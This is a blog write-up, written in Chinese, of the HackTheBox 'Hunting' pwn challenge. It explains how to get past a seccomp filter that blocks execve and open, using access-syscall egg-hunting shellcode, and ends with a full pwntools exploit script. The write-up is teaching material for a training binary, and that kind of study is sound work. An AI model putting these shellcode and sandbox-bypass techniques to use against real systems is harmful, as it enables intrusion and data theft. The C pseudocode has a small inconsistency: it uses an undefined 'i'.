
---
title: Hunting— HTB  PWN  challenge 
categories: [CTF,HTB]
tags: [pwn]

---

一道htb中，比较有意思的手写shellcode题。<!--more-->

## 题目分析

```bash
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

如上，题目是一个32位程序，且保护只开了PIE并开放了读写执行权限。

分析程序主要流程我们可以看到：

![image-20211102210710626](image-20211102210710626.png)

程序先mmap一段空间，将flag如这个空间中。

再用meset把flag原本存放的空间清零。

然后我们有大小为0x3c来写入我们的后门。

但是题目设置seccomp沙箱，禁用一些系统调用。

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x20 0x00 0x00 0x00000000  A = sys_number
 0002: 0x35 0x0a 0x00 0x40000000  if (A >= 0x40000000) goto 0013
 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013
 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013
 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013
 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013
 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

由于禁用了execve和open导致我们无法常规getshell或orw

但经过gdb，我们发现，由于开了PIE,flag的位置是随机的，但是flag位置大小于`0x60000000`.

![image-20211103102846331](image-20211103102846331.png)

再进一步分析，可以看到flag在段地址开始的位置。所以我们以`0x1000`遍历地址，我们就可以发现flag。

```
gdb-peda$ x/20gs 0x6b6d0000
warning: Unable to display strings with size 'g', using 'b' instead.
0x6b6d0000:     "HTB{", 'X' <repeats 31 times>, "}"
0x6b6d0025:     ""
0x6b6d0026:     ""
0x6b6d0027:     ""
0x6b6d0028:     ""
0x6b6d0029:     ""
0x6b6d002a:     ""
0x6b6d002b:     ""
0x6b6d002c:     ""
0x6b6d002d:     ""
0x6b6d002e:     ""
0x6b6d002f:     ""
0x6b6d0030:     ""
0x6b6d0031:     ""
0x6b6d0032:     ""
0x6b6d0033:     ""
0x6b6d0034:     ""
0x6b6d0035:     ""
0x6b6d0036:     ""
```

## 如何定位flag

### access函数

经过查阅资料后我们可以发现access函数不仅可以判断某文件名是否存在还在可以判断某地址段是否存在。

```c
access(const char *filename,int mode);
```

当mode 为0 时，判断是否存在。

当mode 为1时，判断是否有执行权限。

当mode 为2时，判断是否有写权限。

当mode 为3时，判断是否有读权限。

filename参数既可以传入文件名，也可以虚拟内存地址。

### for 循环查找

由于用access函数，我们可以以`0x1000`为一个单位来慢慢遍历。

用c伪代码来表达就是：

```c
for (uint32_t address = 0x60000000; address < 0x7fffffff; address += 0x1000)
{

        if (access(address + i +4) == EFAULT)
            break;
        write(1, address, 0x26);
        exit(0);
        
    
}
```

用汇编来表达就是：

```assembly
mov edx,0x5fffffff;
xor ecx,ecx;
notaccess:
or dx,0xfff;
inc edx;
mov eax,0x21;
lea  ebx,[edx+4]
int 0x80
cmp eax,0xfffffff2;
jz  notaccess;
mov eax,0x04;
mov ebx,1;
mov ecx,edx;
mov edx,0x26
int 0x80
```

## exp

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/11/02 19:51:09
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./hunting'
e=ELF(elf)
#context.log_level = 'debug'
context.arch=e.arch
ip_port=['178.62.96.143',30132]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

shell="""

mov edx,0x5fffffff;
xor ecx,ecx;
notaccess:
or dx,0xfff;
inc edx;
mov eax,0x21;
lea  ebx,[edx+4]
int 0x80
cmp eax,0xfffffff2;
jz  notaccess;

mov eax,0x04;
mov ebx,1;
mov ecx,edx;
mov edx,0x26
int 0x80
"""


debug()
p.sendline(asm(shell))
p.interactive()
```

## 知识点小记

### 汇编指令

有几个汇编指令搞忘了，在这里小记下。

lea  x,[y]

取y对应的地址作为x的值存入。

mov x,[y]

取y对应的地址的值作为x的值存入。

or  x,y

对x,y进行或运算，并将值存入x中。

xor x,y

xor异或运算,当x,y两个不同时结果为1,否则为0.在汇编中有时也用于清零操作，例如 `xor eax,eax ` 清空eax寄存器。

### 延长程序时间

在看大佬博客https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。

```c
alarm(unsigned int seconds);
```





